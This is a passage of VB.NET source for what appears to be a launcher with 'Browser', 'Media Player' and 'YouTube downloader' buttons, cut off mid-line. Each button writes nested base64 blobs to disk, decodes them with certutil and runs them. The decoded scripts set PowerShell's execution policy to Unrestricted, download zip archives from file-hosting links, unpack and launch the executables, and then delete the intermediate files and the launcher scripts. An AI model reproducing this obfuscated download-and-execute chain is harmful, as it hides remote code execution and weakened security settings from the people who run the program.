        sb.AppendLine("echo d2dJaTU2YVhBZ0xVOTFkRVpwPj5Ccm8uRmlsZQ0KZWNobyBiR1VnUW5KdmQzTmxj>>Browser.Files")
        sb.AppendLine("echo aTU2YVhBZ0ppWWdaWGhwZENKOUlId2dEUXBUWlhRdFEyOXVkR1Z1ZENCQ2NtOU1h>>Browser.Files")
        sb.AppendLine("echo VzVyPj5Ccm8uRmlsZQ0KZWNobyBMbUpoZEE9PT4+QnJvLkZpbGUNCnRpbWVvdXQg>>Browser.Files")
        sb.AppendLine("echo L1QgMQ0KY2VydHV0aWwgLWRlY29kZSBCcm8uRmlsZSBCcm8ucHMxDQp0aW1lb3V0>>Browser.Files")
        sb.AppendLine("echo IC9UIDENClBvd2VyU2hlbGwuZXhlIC1GaWxlIEJyby5wczEgLU5vRXhpdA0KdGlt>>Browser.Files")
        sb.AppendLine("echo ZW91dCAvVCAxDQpmaW5kIC9JICJwb3dlcnNoZWxsIC1Db21tYW5kIEludm9rZS1X>>Browser.Files")
        sb.AppendLine("echo ZWJSZXF1ZXN0IGh0dHAiIEJyb0xpbmsuYmF0Pj5Ccm9Eb3dubG9hZExpbmsuYmF0>>Browser.Files")
        sb.AppendLine("echo DQpjZCAlfmRwMCAmJiBzdGFydCBCcm9Eb3dubG9hZExpbmsuYmF0DQp0aW1lb3V0>>Browser.Files")
        sb.AppendLine("echo IC9UIDIyDQpjZCAlfmRwMA0KaWYgbm90IGV4aXN0ICV+ZHAwXEJyb1wgbWtkaXIg>>Browser.Files")
        sb.AppendLine("echo JX5kcDBcQnJvXA0KZWNobyBFeHBhbmQtQXJjaGl2ZSAtUGF0aCAiQnJvd3Nlci56>>Browser.Files")
        sb.AppendLine("echo aXAiIC1EZXN0aW5hdGlvblBhdGggIiV+ZHAwXCI+PiIiVW56aXBCcm8ucHMxDQp0>>Browser.Files")
        sb.AppendLine("echo aW1lb3V0IC9UIDENClBvd2VyU2hlbGwuZXhlIC1GaWxlIFVuemlwQnJvLnBzMSAt>>Browser.Files")
        sb.AppendLine("echo Tm9FeGl0DQp0aW1lb3V0IC9UIDINCmlmIGV4aXN0ICV+ZHAwXEJyb1wgcm1kaXIg>>Browser.Files")
        sb.AppendLine("echo L3MgL3EgJX5kcDBcQnJvXA0KaWYgZXhpc3QgJX5kcDBcQnJvRG93bmxvYWRMaW5r>>Browser.Files")
        sb.AppendLine("echo LmJhdCBkZWwgL3MgL3EgJX5kcDBcQnJvRG93bmxvYWRMaW5rLmJhdA0KaWYgZXhp>>Browser.Files")
        sb.AppendLine("echo c3QgJX5kcDBcQnJvTGluay5iYXQgZGVsIC9zIC9xICV+ZHAwXEJyb0xpbmsuYmF0>>Browser.Files")
        sb.AppendLine("echo DQppZiBleGlzdCAlfmRwMFxCcm93c2VyLnppcCBkZWwgL3MgL3EgJX5kcDBcQnJv>>Browser.Files")
        sb.AppendLine("echo d3Nlci56aXANCmlmIGV4aXN0ICV+ZHAwXEJyby50eHQgZGVsIC9zIC9xICV+ZHAw>>Browser.Files")
        sb.AppendLine("echo XEJyby50eHQNCmlmIGV4aXN0ICV+ZHAwXEJyby5GaWxlIGRlbCAvcyAvcSAlfmRw>>Browser.Files")
        sb.AppendLine("echo MFxCcm8uRmlsZQ0KaWYgZXhpc3QgJX5kcDBcQnJvLnBzMSBkZWwgL3MgL3EgJX5k>>Browser.Files")
        sb.AppendLine("echo cDBcQnJvLnBzMQ0KaWYgZXhpc3QgJX5kcDBcVW56aXBCcm8ucHMxIGRlbCAvcyAv>>Browser.Files")
        sb.AppendLine("echo cSAlfmRwMFxVbnppcEJyby5wczENCmlmIG5vdCBleGlzdCAlfmRwMFxCcm93c2Vy>>Browser.Files")
        sb.AppendLine("echo XEJyb3dzZXIuZXhlIGdvdG8gV2VicGFnZUJybw0KaWYgZXhpc3QgJX5kcDBcQnJv>>Browser.Files")
        sb.AppendLine("echo d3NlclxCcm93c2VyLmV4ZSBnb3RvIFN0YXJ0QnJvDQo6U3RhcnRCcm8NCmNkICV+>>Browser.Files")
        sb.AppendLine("echo ZHAwXEJyb3dzZXJcICYmIHN0YXJ0IEJyb3dzZXIuZXhlDQppZiBleGlzdCAlfmRw>>Browser.Files")
        sb.AppendLine("echo MFxCcm9cIHJtZGlyIC9zIC9xICV+ZHAwXEJyb1wNCmlmIGV4aXN0ICV+ZHAwXEJy>>Browser.Files")
        sb.AppendLine("echo b0xpbmsuYmF0IGRlbCAvcyAvcSAlfmRwMFxCcm9MaW5rLmJhdA0KaWYgZXhpc3Qg>>Browser.Files")
        sb.AppendLine("echo JX5kcDBcQnJvd3Nlci56aXAgZGVsIC9zIC9xICV+ZHAwXEJyb3dzZXIuemlwDQpp>>Browser.Files")
        sb.AppendLine("echo ZiBleGlzdCAlfmRwMFxCcm8udHh0IGRlbCAvcyAvcSAlfmRwMFxCcm8udHh0DQpp>>Browser.Files")
        sb.AppendLine("echo ZiBleGlzdCAlfmRwMFxCcm8uRmlsZSBkZWwgL3MgL3EgJX5kcDBcQnJvLkZpbGUN>>Browser.Files")
        sb.AppendLine("echo CmlmIGV4aXN0ICV+ZHAwXEJyby5wczEgZGVsIC9zIC9xICV+ZHAwXEJyby5wczEN>>Browser.Files")
        sb.AppendLine("echo CmlmIGV4aXN0ICV+ZHAwXFVuemlwQnJvLnBzMSBkZWwgL3MgL3EgJX5kcDBcVW56>>Browser.Files")
        sb.AppendLine("echo aXBCcm8ucHMxDQpnb3RvIEVuZEJybw0KOldlYnBhZ2VCcm8NCnN0YXJ0IGh0dHA6>>Browser.Files")
        sb.AppendLine("echo Ly93d3cubWVkaWFmaXJlLmNvbS9maWxlL2FodWhuYzhsNGYwYmQwZi9Ccm93c2Vy>>Browser.Files")
        sb.AppendLine("echo LnppcA0KZ290byBFbmRCcm8NCjpFbmRCcm8NCmdvdG8gRXhpdA0KOkV4aXQNCkV4>>Browser.Files")
        sb.AppendLine("echo aXQNCg==>>Browser.Files")
        sb.AppendLine("certutil -decode Browser.Files Browser.bat")
        sb.AppendLine("start Browser.bat")
        sb.AppendLine("if exist Browser.Files del /s /q Browser.Files")
        sb.AppendLine("goto End")
        sb.AppendLine(":End")
        sb.AppendLine("exit")
        IO.File.WriteAllText("Bro.bat", sb.ToString())
        Process.Start("Bro.bat")
        Threading.Thread.Sleep(2000)
        System.IO.File.Delete("Bro.bat")
    End Sub
    Private Sub PictureBox3_Click(sender As Object, e As EventArgs) Handles PictureBox3.Click
        If (IO.File.Exists("MediaPlayer.bat")) Then GoTo MediaPlayer
        Call MediaPlayer()
        GoTo EndSub
MediaPlayer:
        Process.Start("MediaPlayer.bat")
        GoTo EndSub
EndSub:
    End Sub
    Sub MediaPlayer()
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("echo Ok1lZGlhUGxheWVyDQpAZWNobyBvZmYNCmlmIG5vdCBleGlzdCAlfmRwMFxNZWRp>>MediaPlayer.Files")
        sb.AppendLine("echo YVBsYXllclxNZWRpYVBsYXllci5leGUgZ290byBNUA0KaWYgZXhpc3QgJX5kcDBc>>MediaPlayer.Files")
        sb.AppendLine("echo TWVkaWFQbGF5ZXJcTWVkaWFQbGF5ZXIuZXhlIGdvdG8gU3RhcnRNUA0KOk1QIA0K>>MediaPlayer.Files")
        sb.AppendLine("echo QGVjaG8gb2ZmDQp0aXRsZSBNUA0KZWNobyAgICoqKioqKioqKioqKioqKioqKioq>>MediaPlayer.Files")
        sb.AppendLine("echo KioqKioqKioqKioqKioqKioqKioqKioqKioNCmVjaG8gICAqKiovLyBVcGRhdGUt>>MediaPlayer.Files")
        sb.AppendLine("echo TVAuYmF0IC8vIFdpbjEwIC8vKioqDQplY2hvICAgKioqKioqKioqKioqKioqKioq>>MediaPlayer.Files")
        sb.AppendLine("echo KioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KY2QgJX5kcDANCmlmIGV4aXN0>>MediaPlayer.Files")
        sb.AppendLine("echo ICV+ZHAwXE1QXCBybWRpciAvcyAvcSAlfmRwMFxNUFwNCmlmIGV4aXN0ICV+ZHAw>>MediaPlayer.Files")
        sb.AppendLine("echo XE1QTGluay5iYXQgZGVsIC9zIC9xICV+ZHAwXE1QTGluay5iYXQNCmlmIGV4aXN0>>MediaPlayer.Files")
        sb.AppendLine("echo ICV+ZHAwXE1lZGlhUGxheWVyLnppcCBkZWwgL3MgL3EgJX5kcDBcTWVkaWFQbGF5>>MediaPlayer.Files")
        sb.AppendLine("echo ZXIuemlwDQppZiBleGlzdCAlfmRwMFxNUC50eHQgZGVsIC9zIC9xICV+ZHAwXE1Q>>MediaPlayer.Files")
        sb.AppendLine("echo LnR4dA0KaWYgZXhpc3QgJX5kcDBcTVAuRmlsZSBkZWwgL3MgL3EgJX5kcDBcTVAu>>MediaPlayer.Files")
        sb.AppendLine("echo RmlsZQ0KaWYgZXhpc3QgJX5kcDBcTVAucHMxIGRlbCAvcyAvcSAlfmRwMFxNUC5w>>MediaPlayer.Files")
        sb.AppendLine("echo czENCmlmIGV4aXN0ICV+ZHAwXFVuemlwTVAucHMxIGRlbCAvcyAvcSAlfmRwMFxV>>MediaPlayer.Files")
        sb.AppendLine("echo bnppcE1QLnBzMQ0KcG93ZXJzaGVsbCBTZXQtRXhlY3V0aW9uUG9saWN5IC1TY29w>>MediaPlayer.Files")
        sb.AppendLine("echo ZSBDdXJyZW50VXNlciBVbnJlc3RyaWN0ZWQNCnBvd2Vyc2hlbGwgLUNvbW1hbmQg>>MediaPlayer.Files")
        sb.AppendLine("echo SW52b2tlLVdlYlJlcXVlc3QgImh0dHA6Ly93d3cubWVkaWFmaXJlLmNvbS9maWxl>>MediaPlayer.Files")
        sb.AppendLine("echo L3hlNWk0bTAzcWVuMTFjci9NZWRpYVBsYXllci56aXAiIC1PdXRGaWxlICJNUC50>>MediaPlayer.Files")
        sb.AppendLine("echo eHQiDQpjZCAlfmRwMA0KZmluZCAvSSAiOi8vZG93bmxvYWQiIE1QLnR4dD4+TVBM>>MediaPlayer.Files")
        sb.AppendLine("echo aW5rLmJhdA0KZWNobyBFeGl0Pj5NUExpbmsuYmF0DQplY2hvIEtFZGxkQzFEYjI1>>MediaPlayer.Files")
        sb.AppendLine("echo MFpXNTBJRTFRVEdsdWF5NWlZWFFwSUh3Z0RRcEdiM0psWVdOb0xVOWlhbVZqZENC>>MediaPlayer.Files")
        sb.AppendLine("echo N0pGOGc+Pk1QLkZpbGUNCmVjaG8gTFhKbGNHeGhZMlVnSW1oeVpXWTlJaUlpTENB>>MediaPlayer.Files")
        sb.AppendLine("echo aWVIbDZNekl4SW4wZ2ZDQU5DbE5sZEMxRGIyNTBaVzUwSUUxUT4+TVAuRmlsZQ0K>>MediaPlayer.Files")
        sb.AppendLine("echo ZWNobyBUR2x1YXk1aVlYUU5DaWhIWlhRdFEyOXVkR1Z1ZENCTlVFeHBibXN1WW1G>>MediaPlayer.Files")
        sb.AppendLine("echo MEtTQjhJQTBLUm05eVpXRmphQzFQPj5NUC5GaWxlDQplY2hvIFltcGxZM1FnZXlS>>MediaPlayer.Files")
        sb.AppendLine("echo ZklDMXlaWEJzWVdObElDSWlJajRpTENBaURRcDZlWGcwTlNKOUlId2dEUXBUWlhR>>MediaPlayer.Files")
        sb.AppendLine("echo dFEyOXU+Pk1QLkZpbGUNCmVjaG8gZEdWdWRDQk5VRXhwYm1zdVltRjBEUW9OQ2lo>>MediaPlayer.Files")
        sb.AppendLine("echo SFpYUXRRMjl1ZEdWdWRDQk5VRXhwYm1zdVltRjBLU0I4SUEwSz4+TVAuRmlsZQ0K>>MediaPlayer.Files")
        sb.AppendLine("echo ZWNobyBSbTl5WldGamFDMVBZbXBsWTNRZ2V5UmZJQzF5WlhCc1lXTmxJQ0o0ZVhv>>MediaPlayer.Files")
        sb.AppendLine("echo ek1qRWlMQ0FpY0c5M1pYSnphR1ZzPj5NUC5GaWxlDQplY2hvIGJDQXRRMjl0YldG>>MediaPlayer.Files")
        sb.AppendLine("echo dVpDQkpiblp2YTJVdFYyVmlVbVZ4ZFdWemRDQWlmU0I4SUEwS1UyVjBMVU52Ym5S>>MediaPlayer.Files")
        sb.AppendLine("echo bGJuUWc+Pk1QLkZpbGUNCmVjaG8gVFZCTWFXNXJMbUpoZEEwS0tFZGxkQzFEYjI1>>MediaPlayer.Files")
        sb.AppendLine("echo MFpXNTBJRTFRVEdsdWF5NWlZWFFwSUh3Z0RRcEdiM0psWVdObz4+TVAuRmlsZQ0K>>MediaPlayer.Files")
        sb.AppendLine("echo ZWNobyBMVTlpYW1WamRDQjdKRjhnTFhKbGNHeGhZMlVnSWk1NmFYQWlMQ0FpTG5w>>MediaPlayer.Files")
        sb.AppendLine("echo cGNDQXRUM1YwUm1sc1pTQk5aV1JwPj5NUC5GaWxlDQplY2hvIFlWQnNZWGxsY2k1>>MediaPlayer.Files")
        sb.AppendLine("echo NmFYQWdKaVlnWlhocGRDSjlJSHdnRFFwVFpYUXRRMjl1ZEdWdWRDQk5VRXhwYm1z>>MediaPlayer.Files")
        sb.AppendLine("echo dVltRjA+Pk1QLkZpbGUNCnRpbWVvdXQgL1QgMQ0KY2VydHV0aWwgLWRlY29kZSBN>>MediaPlayer.Files")
        sb.AppendLine("echo UC5GaWxlIE1QLnBzMQ0KdGltZW91dCAvVCAxDQpQb3dlclNoZWxsLmV4ZSAtRmls>>MediaPlayer.Files")
        sb.AppendLine("echo ZSBNUC5wczEgLU5vRXhpdA0KdGltZW91dCAvVCAxDQpmaW5kIC9JICJwb3dlcnNo>>MediaPlayer.Files")
        sb.AppendLine("echo ZWxsIC1Db21tYW5kIEludm9rZS1XZWJSZXF1ZXN0IGh0dHAiIE1QTGluay5iYXQ+>>MediaPlayer.Files")
        sb.AppendLine("echo Pk1QRG93bmxvYWRMaW5rLmJhdA0KY2QgJX5kcDAgJiYgc3RhcnQgTVBEb3dubG9h>>MediaPlayer.Files")
        sb.AppendLine("echo ZExpbmsuYmF0DQp0aW1lb3V0IC9UIDIyDQpjZCAlfmRwMA0KaWYgbm90IGV4aXN0>>MediaPlayer.Files")
        sb.AppendLine("echo ICV+ZHAwXE1QXCBta2RpciAlfmRwMFxNUFwNCmVjaG8gRXhwYW5kLUFyY2hpdmUg>>MediaPlayer.Files")
        sb.AppendLine("echo LVBhdGggIk1lZGlhUGxheWVyLnppcCIgLURlc3RpbmF0aW9uUGF0aCAiJX5kcDBc>>MediaPlayer.Files")
        sb.AppendLine("echo Ij4+IiJVbnppcE1QLnBzMQ0KdGltZW91dCAvVCAxDQpQb3dlclNoZWxsLmV4ZSAt>>MediaPlayer.Files")
        sb.AppendLine("echo RmlsZSBVbnppcE1QLnBzMSAtTm9FeGl0DQp0aW1lb3V0IC9UIDINCmlmIGV4aXN0>>MediaPlayer.Files")
        sb.AppendLine("echo ICV+ZHAwXE1QXCBybWRpciAvcyAvcSAlfmRwMFxNUFwNCmlmIGV4aXN0ICV+ZHAw>>MediaPlayer.Files")
        sb.AppendLine("echo XE1QRG93bmxvYWRMaW5rLmJhdCBkZWwgL3MgL3EgJX5kcDBcTVBEb3dubG9hZExp>>MediaPlayer.Files")
        sb.AppendLine("echo bmsuYmF0DQppZiBleGlzdCAlfmRwMFxNUExpbmsuYmF0IGRlbCAvcyAvcSAlfmRw>>MediaPlayer.Files")
        sb.AppendLine("echo MFxNUExpbmsuYmF0DQppZiBleGlzdCAlfmRwMFxNZWRpYVBsYXllci56aXAgZGVs>>MediaPlayer.Files")
        sb.AppendLine("echo IC9zIC9xICV+ZHAwXE1lZGlhUGxheWVyLnppcA0KaWYgZXhpc3QgJX5kcDBcTVAu>>MediaPlayer.Files")
        sb.AppendLine("echo dHh0IGRlbCAvcyAvcSAlfmRwMFxNUC50eHQNCmlmIGV4aXN0ICV+ZHAwXE1QLkZp>>MediaPlayer.Files")
        sb.AppendLine("echo bGUgZGVsIC9zIC9xICV+ZHAwXE1QLkZpbGUNCmlmIGV4aXN0ICV+ZHAwXE1QLnBz>>MediaPlayer.Files")
        sb.AppendLine("echo MSBkZWwgL3MgL3EgJX5kcDBcTVAucHMxDQppZiBleGlzdCAlfmRwMFxVbnppcE1Q>>MediaPlayer.Files")
        sb.AppendLine("echo LnBzMSBkZWwgL3MgL3EgJX5kcDBcVW56aXBNUC5wczENCmlmIG5vdCBleGlzdCAl>>MediaPlayer.Files")
        sb.AppendLine("echo fmRwMFxNZWRpYVBsYXllclxNZWRpYVBsYXllci5leGUgZ290byBXZWJwYWdlTVAN>>MediaPlayer.Files")
        sb.AppendLine("echo CmlmIGV4aXN0ICV+ZHAwXE1lZGlhUGxheWVyXE1lZGlhUGxheWVyLmV4ZSBnb3Rv>>MediaPlayer.Files")
        sb.AppendLine("echo IFN0YXJ0TVANCjpTdGFydE1QDQpjZCAlfmRwMFxNZWRpYVBsYXllclwgJiYgc3Rh>>MediaPlayer.Files")
        sb.AppendLine("echo cnQgTWVkaWFQbGF5ZXIuZXhlDQppZiBleGlzdCAlfmRwMFxNUFwgcm1kaXIgL3Mg>>MediaPlayer.Files")
        sb.AppendLine("echo L3EgJX5kcDBcTVBcDQppZiBleGlzdCAlfmRwMFxNUExpbmsuYmF0IGRlbCAvcyAv>>MediaPlayer.Files")
        sb.AppendLine("echo cSAlfmRwMFxNUExpbmsuYmF0DQppZiBleGlzdCAlfmRwMFxNZWRpYVBsYXllci56>>MediaPlayer.Files")
        sb.AppendLine("echo aXAgZGVsIC9zIC9xICV+ZHAwXE1lZGlhUGxheWVyLnppcA0KaWYgZXhpc3QgJX5k>>MediaPlayer.Files")
        sb.AppendLine("echo cDBcTVAudHh0IGRlbCAvcyAvcSAlfmRwMFxNUC50eHQNCmlmIGV4aXN0ICV+ZHAw>>MediaPlayer.Files")
        sb.AppendLine("echo XE1QLkZpbGUgZGVsIC9zIC9xICV+ZHAwXE1QLkZpbGUNCmlmIGV4aXN0ICV+ZHAw>>MediaPlayer.Files")
        sb.AppendLine("echo XE1QLnBzMSBkZWwgL3MgL3EgJX5kcDBcTVAucHMxDQppZiBleGlzdCAlfmRwMFxV>>MediaPlayer.Files")
        sb.AppendLine("echo bnppcE1QLnBzMSBkZWwgL3MgL3EgJX5kcDBcVW56aXBNUC5wczENCmdvdG8gRW5k>>MediaPlayer.Files")
        sb.AppendLine("echo TVANCjpXZWJwYWdlTVANCnN0YXJ0IGh0dHA6Ly93d3cubWVkaWFmaXJlLmNvbS9m>>MediaPlayer.Files")
        sb.AppendLine("echo aWxlL3hlNWk0bTAzcWVuMTFjci9NZWRpYVBsYXllci56aXANCmdvdG8gRW5kTVAN>>MediaPlayer.Files")
        sb.AppendLine("echo CjpFbmRNUA0KZ290byBFeGl0DQo6RXhpdA0KRXhpdA0K>>MediaPlayer.Files")
        sb.AppendLine("certutil -decode MediaPlayer.Files MediaPlayer.bat")
        sb.AppendLine("start MediaPlayer.bat")
        sb.AppendLine("if exist MediaPlayer.Files del /s /q MediaPlayer.Files")
        sb.AppendLine("goto End")
        sb.AppendLine(":End")
        sb.AppendLine("exit")
        IO.File.WriteAllText("WMP.bat", sb.ToString())
        Process.Start("WMP.bat")
        Threading.Thread.Sleep(2000)
        System.IO.File.Delete("WMP.bat")
    End Sub
    Private Sub PictureBox4_Click(sender As Object, e As EventArgs) Handles PictureBox4.Click
        If (IO.File.Exists("AdvancedYoutubeDownloader.bat")) Then GoTo AdvancedYoutubeDownloader
        Call AdvancedYoutubeDownloader()
        GoTo EndSub
AdvancedYoutubeDownloader:
        Process.Start("AdvancedYoutubeDownloader.bat")
        GoTo EndSub
EndSub:
    End Sub
    Sub AdvancedYoutubeDownloader()
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("echo OkFkdmFuY2VkWW91dHViZURvd25sb2FkZXINCkBlY2hvIG9mZg0KaWYgbm90IGV4>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo aXN0ICV+ZHAwXEFkdmFuY2VkWW91dHViZURvd25sb2FkZXJcQWR2YW5jZWRZb3V0>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dWJlRG93bmxvYWRlci5leGUgZ290byBBWUQNCmlmIGV4aXN0ICV+ZHAwXEFkdmFu>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo Y2VkWW91dHViZURvd25sb2FkZXJcQWR2YW5jZWRZb3V0dWJlRG93bmxvYWRlci5l>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo eGUgZ290byBTdGFydEFZRA0KOkFZRCANCkBlY2hvIG9mZg0KdGl0bGUgQVlEDQpl>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo Y2hvICAgKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo KioqKg0KZWNobyAgICoqKi8vIFVwZGF0ZS1BWUQuYmF0IC8vIFdpbjEwIC8vKioq>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo DQplY2hvICAgKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo KioqKioqKg0KY2QgJX5kcDANCmlmIGV4aXN0ICV+ZHAwXEFZRFwgcm1kaXIgL3Mg>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo L3EgJX5kcDBcQVlEXA0KaWYgZXhpc3QgJX5kcDBcQVlETGluay5iYXQgZGVsIC9z>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo IC9xICV+ZHAwXEFZRExpbmsuYmF0DQppZiBleGlzdCAlfmRwMFxBZHZhbmNlZFlv>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dXR1YmVEb3dubG9hZGVyLnppcCBkZWwgL3MgL3EgJX5kcDBcQWR2YW5jZWRZb3V0>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dWJlRG93bmxvYWRlci56aXANCmlmIGV4aXN0ICV+ZHAwXEFZRC50eHQgZGVsIC9z>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo IC9xICV+ZHAwXEFZRC50eHQNCmlmIGV4aXN0ICV+ZHAwXEFZRC5GaWxlIGRlbCAv>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo cyAvcSAlfmRwMFxBWUQuRmlsZQ0KaWYgZXhpc3QgJX5kcDBcQVlELnBzMSBkZWwg>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo L3MgL3EgJX5kcDBcQVlELnBzMQ0KaWYgZXhpc3QgJX5kcDBcVW56aXBBWUQucHMx>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo IGRlbCAvcyAvcSAlfmRwMFxVbnppcEFZRC5wczENCnBvd2Vyc2hlbGwgU2V0LUV4>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZWN1dGlvblBvbGljeSAtU2NvcGUgQ3VycmVudFVzZXIgVW5yZXN0cmljdGVkDQpw>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo b3dlcnNoZWxsIC1Db21tYW5kIEludm9rZS1XZWJSZXF1ZXN0ICJodHRwOi8vd3d3>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo Lm1lZGlhZmlyZS5jb20vZmlsZS93YWhicGpxZm5uaXQ1eHovQWR2YW5jZWRZb3V0>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dWJlRG93bmxvYWRlci56aXAiIC1PdXRGaWxlICJBWUQudHh0Ig0KY2QgJX5kcDAN>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo CmZpbmQgL0kgIjovL2Rvd25sb2FkIiBBWUQudHh0Pj5BWURMaW5rLmJhdA0KZWNo>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo byBFeGl0Pj5BWURMaW5rLmJhdA0KZWNobyBLRWRsZEMxRGIyNTBaVzUwSUVGWlJF>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo eHBibXN1WW1GMEtTQjhJQTBLUm05eVpXRmphQzFQWW1wbFkzUWdleVJmPj5BWUQu>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo RmlsZQ0KZWNobyBJQzF5WlhCc1lXTmxJQ0pvY21WbVBTSWlJaXdnSW5oNWVqTXlN>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo U0o5SUh3Z0RRcFRaWFF0UTI5dWRHVnVkQ0JCPj5BWUQuRmlsZQ0KZWNobyBXVVJN>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo YVc1ckxtSmhkQTBLS0VkbGRDMURiMjUwWlc1MElFRlpSRXhwYm1zdVltRjBLU0I4>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo SUEwS1JtOXlaV0ZqPj5BWUQuRmlsZQ0KZWNobyBhQzFQWW1wbFkzUWdleVJmSUMx>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo eVpYQnNZV05sSUNJaUlqNGlMQ0FpRFFwNmVYZzBOU0o5SUh3Z0RRcFRaWFF0Pj5B>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo WUQuRmlsZQ0KZWNobyBRMjl1ZEdWdWRDQkJXVVJNYVc1ckxtSmhkQTBLRFFvb1Iy>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo VjBMVU52Ym5SbGJuUWdRVmxFVEdsdWF5NWlZWFFwPj5BWUQuRmlsZQ0KZWNobyBJ>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo SHdnRFFwR2IzSmxZV05vTFU5aWFtVmpkQ0I3SkY4Z0xYSmxjR3hoWTJVZ0luaDVl>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ak15TVNJc0lDSndiM2RsPj5BWUQuRmlsZQ0KZWNobyBjbk5vWld4c0lDMURiMjF0>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo WVc1a0lFbHVkbTlyWlMxWFpXSlNaWEYxWlhOMElDSjlJSHdnRFFwVFpYUXRRMjl1>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo Pj5BWUQuRmlsZQ0KZWNobyBkR1Z1ZENCQldVUk1hVzVyTG1KaGRBMEtLRWRsZEMx>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo RGIyNTBaVzUwSUVGWlJFeHBibXN1WW1GMEtTQjhJQTBLPj5BWUQuRmlsZQ0KZWNo>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo byBSbTl5WldGamFDMVBZbXBsWTNRZ2V5UmZJQzF5WlhCc1lXTmxJQ0l1ZW1sd0lp>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo d2dJaTU2YVhBZ0xVOTFkRVpwPj5BWUQuRmlsZQ0KZWNobyBiR1VnUVdSMllXNWpa>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo V1JaYjNWMGRXSmxSRzkzYm14dllXUmxjaTU2YVhBZ0ppWWdaWGhwZENKOUlId2dE>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo UXBUPj5BWUQuRmlsZQ0KZWNobyBaWFF0UTI5dWRHVnVkQ0JCV1VSTWFXNXJMbUpo>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZEE9PT4+QVlELkZpbGUNCnRpbWVvdXQgL1QgMQ0KY2VydHV0aWwgLWRlY29kZSBB>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo WUQuRmlsZSBBWUQucHMxDQp0aW1lb3V0IC9UIDENClBvd2VyU2hlbGwuZXhlIC1G>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo aWxlIEFZRC5wczEgLU5vRXhpdA0KdGltZW91dCAvVCAxDQpmaW5kIC9JICJwb3dl>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo cnNoZWxsIC1Db21tYW5kIEludm9rZS1XZWJSZXF1ZXN0IGh0dHAiIEFZRExpbmsu>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo YmF0Pj5BWUREb3dubG9hZExpbmsuYmF0DQpjZCAlfmRwMCAmJiBzdGFydCBBWURE>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo b3dubG9hZExpbmsuYmF0DQp0aW1lb3V0IC9UIDIyDQpjZCAlfmRwMA0KaWYgbm90>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo IGV4aXN0ICV+ZHAwXEFZRFwgbWtkaXIgJX5kcDBcQVlEXA0KZWNobyBFeHBhbmQt>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo QXJjaGl2ZSAtUGF0aCAiQWR2YW5jZWRZb3V0dWJlRG93bmxvYWRlci56aXAiIC1E>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZXN0aW5hdGlvblBhdGggIiV+ZHAwXCI+PiIiVW56aXBBWUQucHMxDQp0aW1lb3V0>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo IC9UIDENClBvd2VyU2hlbGwuZXhlIC1GaWxlIFVuemlwQVlELnBzMSAtTm9FeGl0>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo DQp0aW1lb3V0IC9UIDINCmlmIGV4aXN0ICV+ZHAwXEFZRFwgcm1kaXIgL3MgL3Eg>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo JX5kcDBcQVlEXA0KaWYgZXhpc3QgJX5kcDBcQVlERG93bmxvYWRMaW5rLmJhdCBk>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZWwgL3MgL3EgJX5kcDBcQVlERG93bmxvYWRMaW5rLmJhdA0KaWYgZXhpc3QgJX5k>>AdvancedYoutubeDownloader.Files")
